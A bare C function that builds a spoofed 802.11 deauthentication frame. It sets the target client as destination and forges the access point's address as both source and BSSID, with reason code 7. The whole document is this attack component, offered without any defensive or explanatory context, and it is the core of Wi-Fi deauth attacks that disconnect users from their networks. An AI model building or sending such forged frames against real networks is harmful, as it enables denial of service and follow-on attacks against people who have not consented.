void buildDeauthFrame(uint8_t* frame, const uint8_t* ap, const uint8_t* cli) {
  frame[0]=0xC0; frame[1]=0x00; // type: deauth
  frame[2]=0x00; frame[3]=0x00; // duration
  memcpy(frame+4,  cli, 6);     // DA
  memcpy(frame+10, ap,  6);     // SA = AP
  memcpy(frame+16, ap,  6);     // BSSID
  frame[22]=0x00; frame[23]=0x00;
  frame[24]=0x07; frame[25]=0x00; // reason: class 3 frame
}

